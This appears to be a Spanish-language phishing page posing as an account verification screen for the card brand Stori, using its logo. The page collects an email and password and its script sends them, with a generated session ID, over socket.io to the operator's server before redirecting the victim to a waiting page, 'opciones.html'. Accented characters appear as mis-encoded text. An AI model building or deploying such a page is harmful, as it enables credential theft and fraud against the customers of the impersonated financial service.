<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>VerificaciÃ³n de cuenta</title>
  <style>
    body {
      background-color: #f3f6fb;
      font-family: Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: #fff;
      border-radius: 15px;
      padding: 40px 30px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      text-align: center;
    }
    .logo {
      margin-bottom: 30px;
    }
    .logo img {
      height: 50px;
    }
    h2 {
      font-size: 1.5em;
      margin-bottom: 10px;
    }
    p {
      color: #777;
      font-size: 0.95em;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1em;
    }
    button {
      background-color: #00b075;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1em;
      width: 100%;
    }
    button:hover {
      background-color: #019765;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://stori.card/img/logo.svg" alt="logo" />
    </div>
    <h2>VerificaciÃ³n de cuenta</h2>
    <p>Ingrese su correo y contraseÃ±a para continuar</p>
    <form id="login-form">
      <input type="text" id="usuario" placeholder="Correo electrÃ³nico" required />
      <input type="password" id="clave" placeholder="ContraseÃ±a" required />
      <button type="submit">Continuar</button>
    </form>
  </div>

  <!-- Scripts al final del body -->
 <!-- Scripts al final del body -->
<script src="/socket.io/socket.io.js"></script>
<script>
  const socket = io();

  window.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('login-form');

    if (form) {
      form.addEventListener('submit', (e) => {
        e.preventDefault();

        const correo = document.getElementById('usuario').value;
        const contrasena = document.getElementById('clave').value;

        // ðŸ”‘ Generar y guardar sessionId
        const sessionId = Math.random().toString(36).substring(2, 15);
        localStorage.setItem('sessionId', sessionId);

        // âœ… Enviar tambiÃ©n el sessionId al servidor
        socket.emit('dataForm', { correo, contrasena, sessionId });

        // ðŸ•’ Ir a pantalla de espera
        window.location.href = 'opciones.html';
      });
    }
  });
</script>

</body>
</html>
